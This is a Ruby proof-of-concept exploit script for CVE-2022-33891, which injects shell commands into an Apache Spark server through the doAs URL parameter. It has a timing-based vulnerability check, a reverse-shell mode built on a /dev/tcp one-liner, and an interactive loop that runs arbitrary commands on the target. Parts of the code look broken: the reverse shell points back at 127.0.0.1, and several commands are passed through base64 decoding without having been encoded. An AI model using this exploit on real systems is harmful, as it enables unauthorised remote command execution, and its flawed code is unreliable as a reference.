#!/usr/bin/ruby
# CVE-2022-33891 Ruby POC Exploit
# Felix Alcala - dethlocker - dethlocker@0xdeadbeef.ai
require 'uri'
require 'net/http'
require 'time'
cmd_args = []
ARGV.each { |arg| cmd_args.push(arg) }
if cmd_args.length <= 1
    puts "Usage ./CVE-2022-33891.rb <DEST> <PORT> [-c for check] [-r for reverse shell] [LISTENING_PORT]"
    exit
end
url = cmd_args[0]
port = cmd_args[1]
if cmd_args.include?("-c") && cmd_args.length == 2
    # perform check
    uri = URI.parse("http://#{url}:#{port}/?doAs='testing")
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Get.new(uri.request_uri)
    if http.head(request.path).code != '403' or !(Net::HTTP.get(uri).include? "org.apache.spark.ui")
        puts "Not vulnerable"
        exit
    end
    #sleepclass = "java.lang.Thread.sleep(java.lang.Long.valueOf(10*1000));System.out.println("");"
    sleepclass = "java.lang.Thread.sleep(java.lang.Long.valueOf(10*1000));"
    sleepclass_b64 = [sleepclass].pack("m*").gsub("+","%2B")
    enc_cmd = "println(\"%s\".decodeBase64().execute())" % sleepclass_b64
    uri = URI.parse("http://#{url}:#{port}/?doAs=`echo -n #{enc_cmd} | base64 -d | bash`")
    request = Net::HTTP::Get.new(uri.request_uri)
    #http = Net::HTTP.new(uri.host, uri.port)
    #response = http.request(request)
    http.read_timeout = 60
    t1 = Time.now
    response = http.request(request)
    sleep(11)
    t2 = Time.now
    delta = t2 - t1
    if delta.to_int >= 10
        puts "Host is vulnerable!"
    else
        puts "Host isn't vulnerable!"
    end
    #puts response.code
    exit
end
if cmd_args.include?("-r")
    if cmd_args.length == 5
        lport = cmd_args[4]
        exec_cmd = "echo -n 'sh -i >& /dev/tcp/127.0.0.1/%s 0>&1' | base64 -d | bash" % lport
        uri = URI.parse("http://#{url}:#{port}/?doAs=`echo -n #{exec_cmd} | base64 -d | bash`")
        request = Net::HTTP::Get.new(uri.request_uri)
        http = Net::HTTP.new(uri.host, uri.port)
        response = http.request(request)
    else
        puts "Usage ./CVE-2022-33891.rb <DEST> <PORT> [-c for check] [-r for reverse shell] [LISTENING_PORT]"
        exit
    end
end
# Interactive shell execution
# TODO: Add a reverse shell option
exec_cmd = ""
while true
    print "> "
    exec_cmd = gets.chomp
    exec_cmd = "echo -n #{exec_cmd} | base64 -d | bash"
    uri = URI.parse("http://#{url}:#{port}/?doAs=`echo -n \"#{exec_cmd}\" | base64 -d | bash`")
    request = Net::HTTP::Get.new(uri.request_uri)
    http = Net::HTTP.new(uri.host, uri.port)
    response = http.request(request)
    #puts response.code
end
